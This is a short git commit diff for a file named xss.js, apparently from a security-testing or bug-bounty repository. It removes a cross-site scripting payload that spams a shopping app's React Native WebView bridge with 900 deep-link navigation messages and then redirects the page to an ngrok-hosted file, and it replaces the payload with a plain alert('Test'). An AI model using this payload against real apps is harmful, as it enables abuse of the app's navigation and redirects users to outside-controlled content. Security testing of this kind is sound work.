24aec7170095eb7a2e898cffa36241320af1306a
GMchik <chupanovgadji@gmail.com>
2026-02-26 23:33:15 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,9 +1,1 @@
-for(let i=0; i<900; i++) {
-  window.ReactNativeWebView.postMessage(JSON.stringify({
-  action: 'navigateDeepLink',
-  data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' 
-    + Math.random().toString(36).substr(2)
-  }));
-}
-
-window.location = "https://pickier-unmindfully-lorelei.ngrok-free.dev/kuper.pdf";
+alert('Test');
